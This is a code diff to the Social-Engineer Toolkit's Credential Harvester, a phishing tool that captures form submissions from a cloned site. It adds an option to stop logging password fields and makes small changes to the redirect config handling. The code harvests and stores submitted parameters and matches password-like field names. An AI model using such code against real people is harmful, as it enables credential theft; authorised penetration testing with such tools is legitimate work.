@@ -103,8 +103,8 @@ for line in fileopen:
         counter=1
 
 # this checks the set_config to see if we need to redirect to a different website instead of the one cloned
-harvester_redirect = check_config("HARVESTER_REDIRECT=").lower()
-if harvester_redirect == "on":
+harvester_redirect = check_config("HARVESTER_REDIRECT=")
+if harvester_redirect.lower() == "on":
     URL = check_config("HARVESTER_URL=")
     counter = 1
 
@@ -287,7 +287,12 @@ class SETHandler(BaseHTTPRequestHandler):
                 counter=1
             match2=re.search("pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass",line)
             if match2:
-                print bcolors.RED+"POSSIBLE PASSWORD FIELD FOUND: "+line+"\r" + bcolors.GREEN
+                # if you don't want to capture a password, turn this off, note not an exact science
+                log_password = check_config("HARVESTER_LOG_PASSWORDS=")
+                if log_password.lower() == "on":
+                    print bcolors.RED+"POSSIBLE PASSWORD FIELD FOUND: "+line+"\r" + bcolors.GREEN
+                else:
+                    line = ""
                 counter=1
             filewrite.write(cgi.escape("PARAM: "+line+"\n"))
             filewrite2.write(line+"\n")
@@ -318,8 +323,8 @@ class SETHandler(BaseHTTPRequestHandler):
             if counter== 0: URL=''
 
         # this checks the set_config to see if we need to redirect to a different website instead of the one cloned
-        harvester_redirect = check_config("HARVESTER_REDIRECT=").lower()
-        if harvester_redirect == "on":
+        harvester_redirect = check_config("HARVESTER_REDIRECT=")
+        if harvester_redirect.lower() == "on":
             RAW_URL = check_config("HARVESTER_URL=")
             counter = 1
 
@@ -527,7 +532,7 @@ if apache_check == False:
 
 if attack_vector != "multiattack":
     if apache_check == False:
-        print bcolors.BLUE+"[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"
+        print bcolors.BLUE+"[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"        
         print "[*] Information will be displayed to you as it arrives below:\r" + bcolors.ENDC
     else:
         print bcolors.BLUE+"[*] Apache is set to ON - everything will be placed in your web root directory of apache."
